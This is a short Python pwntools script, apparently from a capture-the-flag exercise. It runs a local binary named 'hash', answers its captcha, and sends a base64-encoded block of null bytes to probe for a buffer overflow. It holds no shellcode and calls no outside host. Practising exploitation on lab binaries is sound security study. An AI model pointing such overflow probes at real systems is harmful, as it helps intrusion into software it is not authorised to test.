from pwn import *

context.clear(arch='i386', log_level='critical')

non_encoded = ''
encoded = ''
while len(non_encoded) < 766:
    non_encoded += 'A'

non_encoded = '\x00'*1023
encoded = b64e(non_encoded)

print '=========== ENCODED ============'
print encoded, len(encoded)

print '\n========= NOT ENCODED =========='
print non_encoded, len(non_encoded)

print '\nrunning ./hash...'

e = ELF('./hash')
p = e.process()
p.recvline()

captcha = int(p.recvline().split(' : ')[1][:-1])
p.sendline(str(captcha))

p.recvline()
p.recvline()

p.sendline(encoded)

print p.recvline()